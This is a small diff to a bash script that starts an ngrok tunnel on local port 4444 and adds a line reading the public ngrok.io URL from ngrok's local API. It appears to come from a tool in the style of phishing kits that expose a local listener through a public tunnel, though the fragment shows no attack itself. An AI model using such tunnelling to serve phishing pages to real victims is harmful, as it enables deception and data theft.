@@ -15,6 +15,8 @@ echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                             sleep 5
+			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                             sleep 15
                             clear
                            echo ""
                            echo ""
